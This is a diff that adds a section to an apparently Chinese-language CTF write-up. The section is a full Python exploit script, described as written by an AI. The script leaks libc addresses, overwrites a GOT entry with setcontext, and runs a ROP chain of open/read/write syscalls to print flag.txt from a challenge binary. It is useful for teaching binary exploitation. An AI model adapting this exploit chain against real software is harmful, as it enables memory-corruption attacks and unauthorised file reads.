@@ -151,3 +151,140 @@ p.send(p64(elf.got["puts"]))
 p.send(p64(libc.symbols["setcontext"]))
 p.interactive()
 ```
+
+AI 编写的攻击脚本，思路和上面类似：
+
+```python
+#!/usr/bin/env python3
+import subprocess, struct, time, sys
+
+BINARY = './vuln.patched'
+REMOTE = len(sys.argv) > 1 and sys.argv[1] == 'remote'
+
+if REMOTE:
+    host = sys.argv[2] if len(sys.argv) > 2 else 'localhost'
+    port = int(sys.argv[3]) if len(sys.argv) > 3 else 9999
+    import socket
+    s = socket.socket()
+    s.connect((host, port))
+    p_stdin = s.makefile('wb')
+    p_stdout = s.makefile('rb')
+    def read_stdout(n):
+        return p_stdout.read(n)
+else:
+    p = subprocess.Popen([BINARY], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
+    p_stdin = p.stdin
+    def read_stdout(n):
+        return p.stdout.read(n)
+
+def recv_until(marker):
+    data = b''
+    while marker not in data:
+        c = read_stdout(1)
+        if not c:
+            break
+        data += c
+    return data
+
+# Get leaks
+data = recv_until(b'data: ')
+lines = data.split(b'\n')
+buf_addr = int(lines[0].split()[-1], 16)
+puts_addr = int(lines[1].split()[-1], 16)
+print(f'[*] buf: {hex(buf_addr)}', file=sys.stderr)
+print(f'[*] puts: {hex(puts_addr)}', file=sys.stderr)
+
+libc_base = puts_addr - 0x80e50
+print(f'[*] libc: {hex(libc_base)}', file=sys.stderr)
+
+setcontext_addr = libc_base + 0x539e0
+pop_rdi = libc_base + 0x2a3e5
+pop_rsi = libc_base + 0x2be51
+pop_rdx_r12 = libc_base + 0x11f367
+pop_rax = libc_base + 0x45eb0
+syscall_ret = libc_base + 0xec049
+
+pay = b'flag.txt\x00'
+pay += b'\x00' * (0x28 - len(pay))
+pay += struct.pack('<Q', 0)
+pay += struct.pack('<Q', 0)
+pay += b'\x00' * (0x48 - len(pay))
+pay += struct.pack('<Q', 0)
+pay += struct.pack('<Q', 0)
+pay += struct.pack('<Q', 0)
+pay += struct.pack('<Q', 0)
+pay += struct.pack('<Q', 0)
+pay += struct.pack('<Q', 0)
+pay += struct.pack('<Q', 0)
+pay += struct.pack('<Q', 0)
+pay += struct.pack('<Q', 0)
+pay += b'\x00' * (0x98 - len(pay))
+pay += struct.pack('<Q', 0)
+pay += struct.pack('<Q', buf_addr + 0xc0)
+pay += struct.pack('<Q', pop_rdi)
+pay += b'\x00' * (0xc0 - len(pay))
+
+rop = b''
+rop += struct.pack('<Q', buf_addr)
+rop += struct.pack('<Q', pop_rsi)
+rop += struct.pack('<Q', 0)
+rop += struct.pack('<Q', pop_rdx_r12)
+rop += struct.pack('<Q', buf_addr + 0xb0)
+rop += struct.pack('<Q', 0)
+rop += struct.pack('<Q', pop_rax)
+rop += struct.pack('<Q', 2)
+rop += struct.pack('<Q', syscall_ret)
+
+rop += struct.pack('<Q', pop_rdi)
+rop += struct.pack('<Q', 3)
+rop += struct.pack('<Q', pop_rsi)
+rop += struct.pack('<Q', buf_addr + 0x200)
+rop += struct.pack('<Q', pop_rdx_r12)
+rop += struct.pack('<Q', 64)
+rop += struct.pack('<Q', 0)
+rop += struct.pack('<Q', pop_rax)
+rop += struct.pack('<Q', 0)
+rop += struct.pack('<Q', syscall_ret)
+
+rop += struct.pack('<Q', pop_rdi)
+rop += struct.pack('<Q', 1)
+rop += struct.pack('<Q', pop_rsi)
+rop += struct.pack('<Q', buf_addr + 0x200)
+rop += struct.pack('<Q', pop_rdx_r12)
+rop += struct.pack('<Q', 64)
+rop += struct.pack('<Q', 0)
+rop += struct.pack('<Q', pop_rax)
+rop += struct.pack('<Q', 1)
+rop += struct.pack('<Q', syscall_ret)
+
+pay += rop
+pay += b'\x00' * (0x1c0 - len(pay))
+pay += struct.pack('<I', 0x1F80)
+pay += b'\x00' * (0x200 - len(pay))
+
+p_stdin.write(pay)
+p_stdin.flush()
+
+data = recv_until(b'addr: ')
+
+p_stdin.write(struct.pack('<Q', 0x403388))
+p_stdin.flush()
+time.sleep(0.05)
+p_stdin.write(struct.pack('<Q', setcontext_addr))
+p_stdin.flush()
+
+time.sleep(1)
+try:
+    result = b''
+    while True:
+        c = read_stdout(1)
+        if not c:
+            break
+        result += c
+    sys.stdout.buffer.write(result)
+except:
+    pass
+
+if not REMOTE:
+    p.wait()
+```
